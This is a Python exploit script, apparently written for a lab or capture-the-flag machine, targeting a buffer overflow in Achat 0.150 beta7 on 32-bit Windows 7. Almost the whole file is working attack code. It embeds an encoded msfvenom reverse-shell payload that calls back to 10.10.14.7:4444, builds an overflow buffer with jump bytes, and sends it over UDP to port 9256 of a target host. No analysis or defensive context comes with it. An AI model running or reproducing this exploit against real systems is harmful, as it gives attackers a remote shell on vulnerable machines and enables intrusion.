#!/usr/bin/python
# Author KAhara MAnhara
# Achat 0.150 beta7 - Buffer Overflow
# Tested on Windows 7 32bit

import socket
import sys, time

# msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
#Payload size: 512 bytes

buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"
buf += b"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"
buf += b"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"
buf += b"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"
buf += b"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"
buf += b"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"
buf += b"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"
buf += b"\x47\x42\x39\x75\x34\x4a\x42\x39\x6c\x68\x68\x75\x32"
buf += b"\x49\x70\x4d\x30\x6b\x50\x73\x30\x53\x59\x78\x65\x4e"
buf += b"\x51\x79\x30\x62\x44\x34\x4b\x52\x30\x30\x30\x34\x4b"
buf += b"\x61\x42\x7a\x6c\x42\x6b\x4f\x62\x4e\x34\x64\x4b\x54"
buf += b"\x32\x6f\x38\x6a\x6f\x54\x77\x30\x4a\x4c\x66\x4c\x71"
buf += b"\x49\x6f\x66\x4c\x4d\x6c\x33\x31\x63\x4c\x4b\x52\x6c"
buf += b"\x6c\x4b\x70\x77\x51\x66\x6f\x6c\x4d\x39\x71\x45\x77"
buf += b"\x67\x72\x38\x72\x30\x52\x4f\x67\x74\x4b\x72\x32\x4e"
buf += b"\x30\x52\x6b\x50\x4a\x4f\x4c\x64\x4b\x4e\x6c\x6e\x31"
buf += b"\x34\x38\x59\x53\x6d\x78\x39\x71\x78\x51\x72\x31\x42"
buf += b"\x6b\x6e\x79\x4b\x70\x79\x71\x48\x53\x42\x6b\x61\x39"
buf += b"\x4a\x78\x6b\x33\x4f\x4a\x71\x39\x54\x4b\x6e\x54\x42"
buf += b"\x6b\x4d\x31\x49\x46\x6c\x71\x6b\x4f\x66\x4c\x49\x31"
buf += b"\x56\x6f\x5a\x6d\x39\x71\x68\x47\x6e\x58\x49\x50\x31"
buf += b"\x65\x79\x66\x4b\x53\x43\x4d\x5a\x58\x4d\x6b\x31\x6d"
buf += b"\x6e\x44\x74\x35\x37\x74\x52\x38\x74\x4b\x72\x38\x4b"
buf += b"\x74\x4d\x31\x56\x73\x72\x46\x34\x4b\x5a\x6c\x4e\x6b"
buf += b"\x42\x6b\x51\x48\x4b\x6c\x79\x71\x66\x73\x32\x6b\x6d"
buf += b"\x34\x74\x4b\x6a\x61\x38\x50\x32\x69\x31\x34\x4d\x54"
buf += b"\x6f\x34\x6f\x6b\x51\x4b\x4f\x71\x61\x49\x4e\x7a\x52"
buf += b"\x31\x4b\x4f\x77\x70\x51\x4f\x4f\x6f\x70\x5a\x44\x4b"
buf += b"\x6c\x52\x78\x6b\x32\x6d\x6f\x6d\x73\x38\x6f\x43\x30"
buf += b"\x32\x69\x70\x49\x70\x31\x58\x63\x47\x54\x33\x6e\x52"
buf += b"\x71\x4f\x70\x54\x30\x68\x70\x4c\x30\x77\x6e\x46\x4a"
buf += b"\x67\x6b\x4f\x68\x55\x65\x68\x36\x30\x69\x71\x6b\x50"
buf += b"\x59\x70\x6f\x39\x75\x74\x52\x34\x30\x50\x63\x38\x4d"
buf += b"\x59\x71\x70\x50\x6b\x6b\x50\x39\x6f\x38\x55\x72\x30"
buf += b"\x32\x30\x72\x30\x32\x30\x71\x30\x72\x30\x6f\x50\x42"
buf += b"\x30\x42\x48\x67\x7a\x7a\x6f\x69\x4f\x67\x70\x6b\x4f"
buf += b"\x79\x45\x66\x37\x50\x6a\x49\x75\x31\x58\x4b\x5a\x6c"
buf += b"\x4a\x4a\x6e\x59\x77\x51\x58\x49\x72\x4d\x30\x6b\x61"
buf += b"\x31\x4c\x32\x69\x68\x66\x4f\x7a\x6c\x50\x6e\x76\x51"
buf += b"\x47\x32\x48\x73\x69\x64\x65\x53\x44\x4f\x71\x39\x6f"
buf += b"\x7a\x35\x45\x35\x65\x70\x61\x64\x7a\x6c\x59\x6f\x50"
buf += b"\x4e\x6c\x48\x70\x75\x6a\x4c\x43\x38\x7a\x50\x76\x55"
buf += b"\x67\x32\x42\x36\x49\x6f\x47\x65\x50\x68\x50\x63\x50"
buf += b"\x6d\x4f\x74\x59\x70\x71\x79\x4a\x43\x70\x57\x61\x47"
buf += b"\x6e\x77\x30\x31\x4c\x36\x70\x6a\x6b\x62\x4f\x69\x71"
buf += b"\x46\x37\x72\x79\x6d\x50\x66\x77\x57\x30\x44\x4d\x54"
buf += b"\x6d\x6c\x69\x71\x4b\x51\x34\x4d\x4d\x74\x6f\x34\x6e"
buf += b"\x30\x46\x66\x69\x70\x71\x34\x42\x34\x42\x30\x71\x46"
buf += b"\x52\x36\x50\x56\x6f\x56\x50\x56\x30\x4e\x4f\x66\x72"
buf += b"\x36\x52\x33\x30\x56\x51\x58\x61\x69\x58\x4c\x6d\x6f"
buf += b"\x45\x36\x39\x6f\x79\x45\x64\x49\x69\x50\x6e\x6e\x6e"
buf += b"\x76\x30\x46\x69\x6f\x30\x30\x63\x38\x49\x78\x51\x77"
buf += b"\x4d\x4d\x43\x30\x69\x6f\x36\x75\x37\x4b\x6a\x50\x67"
buf += b"\x45\x66\x42\x72\x36\x51\x58\x45\x56\x32\x75\x47\x4d"
buf += b"\x43\x6d\x49\x6f\x7a\x35\x4f\x4c\x6b\x56\x51\x6c\x79"
buf += b"\x7a\x45\x30\x6b\x4b\x67\x70\x54\x35\x6a\x65\x65\x6b"
buf += b"\x51\x37\x4d\x43\x44\x32\x42\x4f\x6f\x7a\x79\x70\x6e"
buf += b"\x73\x49\x6f\x6a\x35\x41\x41"



# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)

fs = "\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"
p  = "A0000000002#Main" + "\x00" + "Z"*114688 + "\x00" + "A"*10 + "\x00"
p += "A0000000002#Main" + "\x00" + "A"*57288 + "AAAAASI"*50 + "A"*(3750-46)
p += "\x62" + "A"*45
p += "\x61\x40" 
p += "\x2A\x46"
p += "\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D" + "C"*9 + "\x60\x43"
p += "\x61\x43" + "\x2A\x46"
p += "\x2A" + fs + "C" * (157-len(fs)- 31-3)
p += buf + "A" * (1152 - len(buf))
p += "\x00" + "A"*10 + "\x00"

print "---->{P00F}!"
i=0
while i<len(p):
    if i > 172000:
        time.sleep(1.0)
    sent = sock.sendto(p[i:(i+8192)], server_address)
    i += sent
sock.close()
